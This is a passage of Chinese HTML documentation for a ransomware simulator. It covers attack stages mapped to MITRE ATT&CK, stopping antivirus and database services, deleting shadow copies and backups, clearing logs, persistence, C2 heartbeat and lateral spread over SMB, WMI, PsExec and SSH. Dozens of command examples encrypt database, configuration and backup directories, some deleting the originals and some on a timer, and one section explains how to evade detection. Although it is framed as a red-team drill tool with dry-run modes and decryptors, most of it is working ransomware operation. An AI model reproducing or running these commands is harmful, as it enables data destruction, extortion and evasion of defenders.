                                <tr><td class="px-3 py-2 border-b border-r">行为控制</td><td class="px-3 py-2 border-b">隐身模式、单项跳过、随机延迟，用于低特征演练</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r">后台驻留</td><td class="px-3 py-2 border-b"><code class="text-[12px]">--resident</code> 加密后保持进程与心跳；<code class="text-[12px]">--keep-key</code> 保留密钥</td></tr>
                            </tbody>
                        </table>
                    </div>

                    <h3 class="text-lg font-semibold text-gray-800 mt-6 mb-2">3.3 自动化与观测</h3>
                    <div class="overflow-x-auto mb-4">
                        <table class="doc-table w-full text-sm border border-collapse">
                            <thead class="bg-gray-50 text-gray-600"><tr><th class="text-left px-3 py-2 border-b border-r">能力</th><th class="text-left px-3 py-2 border-b">说明</th></tr></thead>
                            <tbody>
                                <tr><td class="px-3 py-2 border-b border-r">定时触发</td><td class="px-3 py-2 border-b"><code class="text-[12px]">--delay</code> / <code class="text-[12px]">--at</code> / <code class="text-[12px]">--random-delay</code>，默认自动后台化 + 开机自启</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r">攻击面侦察</td><td class="px-3 py-2 border-b">并发 TCP 端口发现、服务指纹、本机资产（网卡/监听端口/ARP），输出 JSON/CSV</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r">远程横向编排</td><td class="px-3 py-2 border-b">SMB / WMI / schtasks / PsExec / SSH 投递与执行，默认演练护栏</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r">C2 心跳</td><td class="px-3 py-2 border-b">每 30 秒心跳，管理后台查看在线终端</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r">日志审计</td><td class="px-3 py-2 border-b">成功/失败/操作日志、侦察报告、远程报告，便于复盘</td></tr>
                            </tbody>
                        </table>
                    </div>
                </section>

                <section id="attackchain" class="mb-12">
                    <h2 class="text-2xl font-bold text-gray-800 mb-4 pb-2 border-b border-gray-200">4. 攻击链阶段与 ATT&amp;CK 映射</h2>
                    <p class="text-sm leading-7 text-gray-600 mb-3">程序按阶段执行，便于在演练中观察和拦截；<code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">-dry-run</code> 或隐身模式会跳过破坏性阶段。</p>

                    <h3 class="text-lg font-semibold text-gray-800 mt-6 mb-2">4.1 执行阶段</h3>
                    <div class="overflow-x-auto mb-4">
                        <table class="doc-table w-full text-sm border border-collapse">
                            <thead class="bg-gray-50 text-gray-600"><tr><th class="text-left px-3 py-2 border-b border-r">阶段</th><th class="text-left px-3 py-2 border-b border-r">内容</th><th class="text-left px-3 py-2 border-b">产物/说明</th></tr></thead>
                            <tbody>
                                <tr><td class="px-3 py-2 border-b border-r">阶段 0</td><td class="px-3 py-2 border-b border-r">定时触发</td><td class="px-3 py-2 border-b">计算触发时间，自动转后台并注册自启；日志 scheduler.log</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r">阶段 1</td><td class="px-3 py-2 border-b border-r">互斥锁持久化</td><td class="px-3 py-2 border-b">单实例锁；PID 写入锁文件，异常退出可接管</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r">阶段 2</td><td class="px-3 py-2 border-b border-r">防御规避与发现</td><td class="px-3 py-2 border-b">停止服务、清理缓存、终止进程、清理卷影/日志；可整体或单项跳过</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r">阶段 1.5</td><td class="px-3 py-2 border-b border-r">攻击面侦察</td><td class="px-3 py-2 border-b">recon_report_&lt;ts&gt;.json / .csv（开启 --scan 时）</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r">阶段 3</td><td class="px-3 py-2 border-b border-r">载荷部署（加密）</td><td class="px-3 py-2 border-b">.encrypted 文件；成功/失败/操作日志；勒索信投放</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r">阶段 4</td><td class="px-3 py-2 border-b border-r">勒索信增强</td><td class="px-3 py-2 border-b">桌面勒索信、勒索壁纸（非演习模式）</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r">阶段 5</td><td class="px-3 py-2 border-b border-r">远程横向编排</td><td class="px-3 py-2 border-b">remote_report_&lt;ts&gt;.json（开启 --remote-* 时）</td></tr>
                            </tbody>
                        </table>
                    </div>

                    <h3 class="text-lg font-semibold text-gray-800 mt-6 mb-2">4.2 MITRE ATT&amp;CK 映射</h3>
                    <div class="overflow-x-auto mb-4">
                        <table class="doc-table w-full text-sm border border-collapse">
                            <thead class="bg-gray-50 text-gray-600"><tr><th class="text-left px-3 py-2 border-b border-r">战术</th><th class="text-left px-3 py-2 border-b border-r">ID</th><th class="text-left px-3 py-2 border-b">模拟行为</th></tr></thead>
                            <tbody>
                                <tr><td class="px-3 py-2 border-b border-r whitespace-nowrap">防御规避</td><td class="px-3 py-2 border-b border-r">TA0005</td><td class="px-3 py-2 border-b">停止数据库/安全服务、清理缓存与系统内存、解除进程守护、低特征对抗（SIGTERM 替代 SIGKILL、移除 systemctl disable、随机延迟）</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r whitespace-nowrap">持久化</td><td class="px-3 py-2 border-b border-r">TA0003</td><td class="px-3 py-2 border-b">增强互斥锁、定时持久化（schtasks / systemd-run / at / crontab）、开机自启</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r whitespace-nowrap">发现</td><td class="px-3 py-2 border-b border-r">TA0007</td><td class="px-3 py-2 border-b">增强文件识别、数据库目录发现、网络与主机发现（端口、服务指纹、监听端口、ARP）</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r whitespace-nowrap">横向移动</td><td class="px-3 py-2 border-b border-r">TA0008</td><td class="px-3 py-2 border-b">数据库连接解挂、远程横向加密（SMB/WMI/schtasks/PsExec/SSH）</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r whitespace-nowrap">影响</td><td class="px-3 py-2 border-b border-r">TA0040</td><td class="px-3 py-2 border-b">关键资产加密、完整过程日志、勒索信与壁纸</td></tr>
                            </tbody>
                        </table>
                    </div>

                    <h3 class="text-lg font-semibold text-gray-800 mt-6 mb-2">4.3 破坏性技术细节</h3>
                    <ul class="list-disc pl-5 space-y-1 text-sm leading-7 text-gray-600 mb-4">
                        <li><strong>服务停止</strong>：Linux 覆盖 MySQL、PostgreSQL、MongoDB、Redis、Oracle 与常见安全/监控服务（优先 SIGTERM，回退 systemctl）；Windows 覆盖 MSSQLSERVER、MySQL80、PostgreSQL、MongoDB、Redis、WinDefend、Sense、McAfee、Sophos、Kaspersky、vssvc、wbengine 等。</li>
                        <li><strong>内存清理</strong>：Linux 清理数据库缓存、页面缓存、ARP/DNS 缓存；Windows 执行 SQL Server 的 DBCC DROPCLEANBUFFERS / DBCC FREEPROCCACHE 与 ipconfig /flushdns。</li>
                        <li><strong>进程守护解除</strong>：Linux 处理 supervisord、monit 等非系统级守护与 cron/atd；Windows 使用 taskkill 终止 Office、数据库、备份与安全软件进程。</li>
                        <li><strong>数据库链接解挂</strong>：终止 mysql/psql/mongo/redis-cli 客户端进程，关闭数据库端口连接（不含 ss -K 全断网）。</li>
                        <li><strong>卷影与日志清理</strong>：vssadmin 删除卷影、wbadmin 删除备份目录、wevtutil 清理事件日志（Windows）；Linux 清理备份与日志文件。</li>
                        <li><strong>壁纸篡改</strong>：加密完成后生成红底白字勒索壁纸并立即设为桌面背景；原始壁纸路径会打印并写入 operations.log 便于还原。</li>
                    </ul>

                    <h3 class="text-lg font-semibold text-gray-800 mt-6 mb-2">4.4 低特征改进（v3.4 起）</h3>
                    <div class="overflow-x-auto mb-4">
                        <table class="doc-table w-full text-sm border border-collapse">
                            <thead class="bg-gray-50 text-gray-600"><tr><th class="text-left px-3 py-2 border-b border-r">原行为（高特征）</th><th class="text-left px-3 py-2 border-b border-r">低特征替代</th><th class="text-left px-3 py-2 border-b">说明</th></tr></thead>
                            <tbody>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[12px]">systemctl stop postgresql</td><td class="px-3 py-2 border-b border-r font-mono text-[12px]">pgrep -x → kill &lt;pid&gt;（SIGTERM）</td><td class="px-3 py-2 border-b">避免 systemctl 强告警特征</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[12px]">systemctl disable</td><td class="px-3 py-2 border-b border-r">已移除</td><td class="px-3 py-2 border-b">修改开机启动项极易触发告警</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[12px]">pkill -9 -f</td><td class="px-3 py-2 border-b border-r font-mono text-[12px]">pkill -f（SIGTERM）</td><td class="px-3 py-2 border-b">SIGKILL 是勒索软件典型特征</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r font-mono text-[12px]">ss -K 全网络连接关闭</td><td class="px-3 py-2 border-b border-r">已移除</td><td class="px-3 py-2 border-b">大规模断网触发网络层检测</td></tr>
                                <tr><td class="px-3 py-2 border-b border-r">固定顺序执行</td><td class="px-3 py-2 border-b border-r font-mono text-[12px]">--aggressive-delay</td><td class="px-3 py-2 border-b">打乱时序特征</td></tr>
                            </tbody>
                        </table>
                    </div>
                </section>

                <section id="scenarios" class="mb-12">
                    <h2 class="text-2xl font-bold text-gray-800 mb-4 pb-2 border-b border-gray-200">5. 使用场景大全（多操作系统）</h2>
                    <p class="text-sm leading-7 text-gray-600 mb-3">按目标分类整理了常见用法。Windows 使用 cmd / PowerShell，Linux 与 macOS 使用 bash；真实加密前请先用 <code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">-dry-run</code> 确认目标清单。</p>

                    <h3 class="text-lg font-semibold text-gray-800 mt-8 mb-2">3.1 演习与防御验证</h3>

                    <h4 class="text-base font-semibold text-gray-800 mt-5 mb-1">场景 1：目录演习（只列目标，不改文件）</h4>
                    <p class="text-sm leading-7 text-gray-600 mb-2">用于安全审计、防御演练前确认影响面。演习模式不会加密、不停止服务、不改壁纸。</p>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code># Windows
ransom_simulator.exe -dry-run -dir="D:\test" -log

# Linux / macOS
./ransom_simulator_linux -dry-run -dir="/tmp/test" -log</code></pre>

                    <h4 class="text-base font-semibold text-gray-800 mt-5 mb-1">场景 2：扩展名演习（配置/密钥类文件）</h4>
                    <p class="text-sm leading-7 text-gray-600 mb-2">只关注配置与密钥文件，评估暴露面，不实际加密。</p>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code># Windows
ransom_simulator.exe -dry-run -ext=".conf,.key,.pem,.env,.ini" -log

# Linux / macOS
./ransom_simulator_linux -dry-run -ext=".conf,.key,.pem,.env,.ini" -log</code></pre>

                    <h4 class="text-base font-semibold text-gray-800 mt-5 mb-1">场景 3：日志审计演练</h4>
                    <p class="text-sm leading-7 text-gray-600 mb-2">生成完整日志，用于验证日志采集与告警规则；配合 <code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">-dry-run</code> 不产生破坏。</p>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code>ransom_simulator.exe -log -dry-run -workers=2 -ext=".log,.txt"
./ransom_simulator_linux -log -dry-run -workers=2 -ext=".log,.txt"</code></pre>

                    <h3 class="text-lg font-semibold text-gray-800 mt-8 mb-2">3.2 定向加密（文件 / 目录 / 类型）</h3>

                    <h4 class="text-base font-semibold text-gray-800 mt-5 mb-1">场景 4：加密单个文件</h4>
                    <p class="text-sm leading-7 text-gray-600 mb-2"><code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">-dir</code> 接受单个文件路径，只处理该文件。</p>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code># Windows
ransom_simulator.exe -dir="D:\test\report.docx" -log

# Linux / macOS
./ransom_simulator_linux -dir="/tmp/report.docx" -log</code></pre>

                    <h4 class="text-base font-semibold text-gray-800 mt-5 mb-1">场景 5：加密多个指定文件</h4>
                    <p class="text-sm leading-7 text-gray-600 mb-2">多个目标用英文逗号分隔，路径含空格时用引号包住整个参数。</p>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code># Windows
ransom_simulator.exe -dir="D:\a.txt,D:\b.xlsx,D:\c.pdf" -workers=4 -log

# Linux / macOS
./ransom_simulator_linux -dir="/tmp/a.txt,/tmp/b.xlsx,/tmp/c.pdf" -workers=4 -log</code></pre>

                    <h4 class="text-base font-semibold text-gray-800 mt-5 mb-1">场景 6：加密整个目录</h4>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code># Windows
ransom_simulator.exe -dir="D:\test" -log

# Linux / macOS
./ransom_simulator_linux -dir="/tmp/test" -log</code></pre>
                    <p class="text-sm leading-7 text-gray-600">指定目录时会处理目录下所有格式；如需限制类型请加 <code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">-ext</code>。</p>

                    <h4 class="text-base font-semibold text-gray-800 mt-5 mb-1">场景 7：数据库目录</h4>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code># Linux：MySQL / PostgreSQL / MongoDB 数据目录
./ransom_simulator_linux -log -dir="/var/lib/mysql,/var/lib/postgresql,/var/lib/mongodb" -workers=4

# Windows：默认数据库目录（需管理员权限停止服务）
ransom_simulator.exe -log -dir="C:\ProgramData\MySQL,C:\Program Files\Microsoft SQL Server" -workers=4</code></pre>
                    <p class="text-sm leading-7 text-gray-600">非演习模式会先尝试停止数据库/安全服务、清理缓存，再加密数据文件。</p>

                    <h4 class="text-base font-semibold text-gray-800 mt-5 mb-1">场景 8：配置文件与证书</h4>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code>./ransom_simulator_linux -log -dir="/etc" -ext=".conf,.key,.pem,.crt,.env,.ini,.yaml"
ransom_simulator.exe -log -dir="D:\configs" -ext=".conf,.key,.pem,.json,.ini"</code></pre>

                    <h4 class="text-base font-semibold text-gray-800 mt-5 mb-1">场景 9：备份与导出文件</h4>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code>./ransom_simulator_linux -log -dir="/backup" -ext=".bak,.sql,.dump,.zip,.tar,.gz"
ransom_simulator.exe -log -dir="D:\backup" -ext=".bak,.sql,.zip"</code></pre>

                    <h4 class="text-base font-semibold text-gray-800 mt-5 mb-1">场景 10：网页与模板文件</h4>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code>./ransom_simulator_linux -log -dir="/var/www" -ext=".html,.htm,.js,.css,.php,.twig,.tpl"
ransom_simulator.exe -log -dir="D:\www" -ext=".html,.htm,.js,.css"</code></pre>

                    <h4 class="text-base font-semibold text-gray-800 mt-5 mb-1">场景 11：大文件（部分加密）</h4>
                    <p class="text-sm leading-7 text-gray-600 mb-2">单个文件超过 1GB 时自动使用“头部 + 尾部 + 随机中间块”的部分加密，避免长时间占用；可用 <code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">-workers</code> 控制并发。</p>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code>ransom_simulator.exe -dir="D:\bigfiles" -workers=4 -log
./ransom_simulator_linux -dir="/data/bigfiles" -workers=4 -log</code></pre>

                    <h4 class="text-base font-semibold text-gray-800 mt-5 mb-1">场景 12：并发与资源控制</h4>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code># 低配环境：降低并发
./ransom_simulator_linux -dir="/tmp/test" -workers=2
# 高吞吐：按 CPU 核心数并发（默认即为 CPU 核心数）
ransom_simulator.exe -dir="D:\test" -workers=16</code></pre>

                    <h3 class="text-lg font-semibold text-gray-800 mt-8 mb-2">3.3 加密并删除源文件（-remove）</h3>

                    <h4 class="text-base font-semibold text-gray-800 mt-5 mb-1">场景 13：目录加密并删除</h4>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code># 先演习确认范围
ransom_simulator.exe -dir="D:\test" -dry-run
# 真实执行（删除源文件）
ransom_simulator.exe -dir="D:\test" -remove -log

./ransom_simulator_linux -dir="/tmp/test" -dry-run
./ransom_simulator_linux -dir="/tmp/test" -remove -log</code></pre>

                    <h4 class="text-base font-semibold text-gray-800 mt-5 mb-1">场景 14：指定文件加密并删除</h4>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code>ransom_simulator.exe -dir="D:\test\report.docx" -remove -log
./ransom_simulator_linux -dir="/tmp/report.docx" -remove -log</code></pre>
                    <div class="border-l-4 border-red-400 bg-red-50 text-red-800 text-sm p-4 rounded mb-4">
                        <p><code class="font-mono">-remove</code> 会在加密成功后删除源文件，只保留 .encrypted；请确认私钥可用并已备份数据。</p>
                    </div>

                    <h3 class="text-lg font-semibold text-gray-800 mt-8 mb-2">3.4 定时触发与后台运行</h3>

                    <h4 class="text-base font-semibold text-gray-800 mt-5 mb-1">场景 15：延迟执行（自动后台）</h4>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code># Windows：30 分钟后执行（自动转入后台并注册开机自启）
ransom_simulator.exe -dir="D:\test" -delay 30m -log

# 叠加 0~5 分钟随机抖动，打乱固定时序
ransom_simulator.exe -dir="D:\test" -delay 30m --random-delay 5m -log

# Linux / macOS
./ransom_simulator_linux -dir="/tmp/test" -delay 30m --random-delay 5m -log</code></pre>

                    <h4 class="text-base font-semibold text-gray-800 mt-5 mb-1">场景 16：指定时刻执行</h4>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code># 今天 03:00（已过则次日）
ransom_simulator.exe -dir="D:\test" --at "03:00" -log
# 指定日期时间
ransom_simulator.exe -dir="D:\test" --at "2026-12-01 03:00:00" -log
./ransom_simulator_linux -dir="/tmp/test" --at "2026-12-01 03:00:00" -log</code></pre>

                    <h4 class="text-base font-semibold text-gray-800 mt-5 mb-1">场景 17：定时加密并删除源文件</h4>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code>ransom_simulator.exe -dir="D:\test" -remove -delay 5m -log
ransom_simulator.exe -dir="D:\test\report.docx" -remove --at "03:00" -log
./ransom_simulator_linux -dir="/tmp/test" -remove -delay 5m -log</code></pre>
                    <p class="text-sm leading-7 text-gray-600">到点执行、完成后自动清理自启；进度见程序目录 <code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">scheduler.log</code>。</p>

                    <h4 class="text-base font-semibold text-gray-800 mt-5 mb-1">场景 18：系统级一次性任务（--persist-schedule）</h4>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code># 注册后主进程退出，到点由系统唤起
ransom_simulator.exe -dir="D:\test" --at "02:30" --persist-schedule
./ransom_simulator_linux -dir="/tmp/test" --at "02:30" --persist-schedule --schedule-task-name MyTask</code></pre>

                    <h4 class="text-base font-semibold text-gray-800 mt-5 mb-1">场景 19：前台等待 / 不注册自启</h4>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code># 保持在前台倒计时（Ctrl+C 可中断）
ransom_simulator.exe -dir="D:\test" -delay 10m --foreground
# 只在本进程等待，不写开机自启
ransom_simulator.exe -dir="D:\test" -delay 10m --no-autostart</code></pre>

                    <h4 class="text-base font-semibold text-gray-800 mt-5 mb-1">场景 20：取消定时任务</h4>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code># Windows
schtasks /delete /tn RansomSimTask-Auto /f
del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\RansomSimAuto-RansomSimTask.vbs"

# Linux / macOS
crontab -l | grep -v 'RansomSimTask-autostart' | crontab -</code></pre>

                    <h3 class="text-lg font-semibold text-gray-800 mt-8 mb-2">3.5 密钥与离线环境</h3>

                    <h4 class="text-base font-semibold text-gray-800 mt-5 mb-1">场景 21：默认联网获取密钥</h4>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code>ransom_simulator.exe -dir="D:\test" -log
./ransom_simulator_linux -dir="/tmp/test" -log</code></pre>

                    <h4 class="text-base font-semibold text-gray-800 mt-5 mb-1">场景 22：离线运行（本地公钥）</h4>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code># 把公钥放到程序同目录（以下命名均可）
#   public_key_<uuid>.pem / public_key.pem / 任意 *.pem
# 断网或接口不可用时自动使用本地公钥，不会退出
ransom_simulator.exe -dir="D:\test" -log
./ransom_simulator_linux -dir="/tmp/test" -log</code></pre>

                    <h4 class="text-base font-semibold text-gray-800 mt-5 mb-1">场景 23：密钥保留与缓存</h4>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code>ransom_simulator.exe -dir="D:\test" -keep-key -log
./ransom_simulator_linux -dir="/tmp/test" -keep-key -log</code></pre>
                    <p class="text-sm leading-7 text-gray-600">缓存文件：程序目录 <code class="px-1.5 py-0.5 bg-gray-100 rounded text-[13px] font-mono">key_cache_&lt;uuid&gt;.json</code> 与用户配置目录（Windows：%AppData%\RansomSimulator\keys；Linux/macOS：~/.config/RansomSimulator/keys）；不会被扫描、加密或删除。</p>

                    <h3 class="text-lg font-semibold text-gray-800 mt-8 mb-2">3.6 驻留与终端心跳</h3>

                    <h4 class="text-base font-semibold text-gray-800 mt-5 mb-1">场景 24：加密后驻留后台</h4>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code>ransom_simulator.exe -dir="D:\test" -resident -log
./ransom_simulator_linux -dir="/tmp/test" -resident -log</code></pre>
                    <p class="text-sm leading-7 text-gray-600">驻留期间保持 30 秒心跳与单实例锁，后台持续显示在线；Ctrl+C 结束。</p>

                    <h4 class="text-base font-semibold text-gray-800 mt-5 mb-1">场景 25：接入管理后台（心跳密钥）</h4>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code>ransom_simulator.exe -dir="D:\test" -heartbeat-token "your-token" -log
./ransom_simulator_linux -dir="/tmp/test" -heartbeat-token "your-token" -log

# 也可用环境变量
export RANSOM_HEARTBEAT_TOKEN="your-token"</code></pre>

                    <h3 class="text-lg font-semibold text-gray-800 mt-8 mb-2">3.7 行为控制与低特征</h3>

                    <h4 class="text-base font-semibold text-gray-800 mt-5 mb-1">场景 26：隐身模式（只加密，不碰系统）</h4>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code># Windows
ransom_simulator.exe -log --stealth-mode -dir="D:\test" -ext=".txt,.doc"
# Linux / macOS
./ransom_simulator_linux -log --stealth -dir="/tmp/test" -ext=".txt,.doc"</code></pre>

                    <h4 class="text-base font-semibold text-gray-800 mt-5 mb-1">场景 27：低特征组合（跳过日志清除与杀进程）</h4>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code>ransom_simulator.exe -log --no-clear-logs --no-kill-procs --aggressive-delay=3000 -dir="D:\test"
./ransom_simulator_linux -log --no-clear-logs --no-kill-procs --aggressive-delay=3000 -dir="/tmp/test"</code></pre>

                    <h4 class="text-base font-semibold text-gray-800 mt-5 mb-1">场景 28：仅跳过部分破坏操作</h4>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code># 保留停止服务与清理日志，只跳过杀进程
ransom_simulator.exe -log --no-kill-procs -dir="D:\test"
# 只跳过清除备份与日志
ransom_simulator.exe -log --no-clear-logs -dir="D:\test"</code></pre>

                    <h3 class="text-lg font-semibold text-gray-800 mt-8 mb-2">3.8 攻击面侦察</h3>

                    <h4 class="text-base font-semibold text-gray-800 mt-5 mb-1">场景 29：仅侦察（不加密）</h4>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code>ransom_simulator.exe --scan-only --scan-targets auto --scan-ports "445,22,3389,3306"
./ransom_simulator_linux --scan-only --scan-targets auto --scan-ports "445,22,3389,3306"</code></pre>

                    <h4 class="text-base font-semibold text-gray-800 mt-5 mb-1">场景 30：指定网段与端口并发</h4>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code>./ransom_simulator_linux -log --scan-only \
  --scan-targets "10.0.0.0/24,10.0.1.5" \
  --scan-workers 256 --scan-timeout 500ms

ransom_simulator.exe -log --scan-only --scan-targets-file targets.txt --scan-icmp</code></pre>
                    <p class="text-sm leading-7 text-gray-600">侦察只做 TCP 连接探测与本机资产枚举；单网段最多展开 1024 个地址，总目标上限 4096。</p>

                    <h3 class="text-lg font-semibold text-gray-800 mt-8 mb-2">3.9 远程横向加密</h3>

                    <h4 class="text-base font-semibold text-gray-800 mt-5 mb-1">场景 31：Windows 控制端（演练）</h4>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code>ransom_simulator.exe -log --remote-hosts "10.0.0.21,10.0.0.22" \
  --remote-user Administrator --remote-pass "P@ssw0rd" --remote-method schtasks</code></pre>
                    <p class="text-sm leading-7 text-gray-600">默认只做连通性与投递演练，远端以 -dry-run 执行。</p>

                    <h4 class="text-base font-semibold text-gray-800 mt-5 mb-1">场景 32：Windows 控制端（真实执行）</h4>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code>ransom_simulator.exe -log --remote-hosts-file targets.txt --remote-user Administrator \
  --remote-pass "P@ssw0rd" --remote-confirm \
  --remote-args "-workers 8 -remove" --remote-cleanup</code></pre>

                    <h4 class="text-base font-semibold text-gray-800 mt-5 mb-1">场景 33：Linux/macOS 控制端（SSH）</h4>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code>./ransom_simulator_linux -log --remote-hosts "ops@10.0.0.31,root@10.0.0.32" \
  --remote-key ~/.ssh/id_rsa --remote-method ssh --remote-cleanup</code></pre>

                    <h4 class="text-base font-semibold text-gray-800 mt-5 mb-1">场景 34：侦察结果驱动远程编排</h4>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code>ransom_simulator.exe -log --scan --scan-targets auto --remote-auto --remote-method auto</code></pre>

                    <h3 class="text-lg font-semibold text-gray-800 mt-8 mb-2">3.10 平台与架构差异</h3>

                    <h4 class="text-base font-semibold text-gray-800 mt-5 mb-1">场景 35：Windows 指定目录</h4>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code>ransom_simulator.exe -log -dir="C:\Users\TestUser\Documents" -ext=".docx,.xlsx,.pdf"</code></pre>

                    <h4 class="text-base font-semibold text-gray-800 mt-5 mb-1">场景 36：Linux 静态包 / systemd 环境</h4>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code>chmod +x ransom_simulator_linux_static
./ransom_simulator_linux_static -dry-run -dir="/opt/data"</code></pre>

                    <h4 class="text-base font-semibold text-gray-800 mt-5 mb-1">场景 37：macOS（通用二进制 / Apple Silicon）</h4>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code>chmod +x ransom_simulator_macos
xattr -d com.apple.quarantine ransom_simulator_macos 2>/dev/null || true
./ransom_simulator_macos -dry-run -dir="/tmp/test"</code></pre>

                    <h4 class="text-base font-semibold text-gray-800 mt-5 mb-1">场景 38：ARM 设备</h4>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code># 树莓派 4/5（64 位系统）
chmod +x ransom_simulator_linux_arm64
./ransom_simulator_linux_arm64 -dry-run -dir="/home/pi/test"

# 32 位 ARM 设备
chmod +x ransom_simulator_linux_arm
./ransom_simulator_linux_arm -dry-run -dir="/home/pi/test"

# Windows on ARM
ransom_simulator_arm64.exe -dry-run -dir="C:\test"</code></pre>

                    <h3 class="text-lg font-semibold text-gray-800 mt-8 mb-2">3.11 解密与恢复</h3>

                    <h4 class="text-base font-semibold text-gray-800 mt-5 mb-1">场景 39：浏览器在线解密</h4>
                    <p class="text-sm leading-7 text-gray-600">打开 <a href="/decrypt" class="text-blue-600 underline">/decrypt</a>，输入 UUID 或私钥，选择 .encrypted 文件或文件夹；解密完全在浏览器本地完成，文件不会上传。</p>

                    <h4 class="text-base font-semibold text-gray-800 mt-5 mb-1">场景 40：命令行解密</h4>
<pre class="bg-gray-900 text-gray-100 text-[13px] rounded-lg p-4 overflow-x-auto mb-4"><code># Windows
decryptor.exe -key-file private.pem -dir "D:\test" -dry-run
decryptor.exe -key-file private.pem -dir "D:\test" -workers 4 -verbose -remove

# Linux / macOS
./decryptor_linux -key-file private.pem -dir "/tmp/test" -dry-run
./decryptor_linux -key-file private.pem -dir "/tmp/test" -workers 4 -remove</code></pre>

                    <h4 class="text-base font-semibold text-gray-800 mt-5 mb-1">场景 41：大文件部分加密（PENC）恢复</h4>
                    <p class="text-sm leading-7 text-gray-600">大于 1GB 的文件采用部分加密；命令行工具可直接解密，浏览器端会导出 .decrypted_chunks.json 供手动合并。</p>
</section>

                <section id="params" class="mb-12">
                    <h2 class="text-2xl font-bold text-gray-800 mb-4 pb-2 border-b border-gray-200">6. 参数详解</h2>
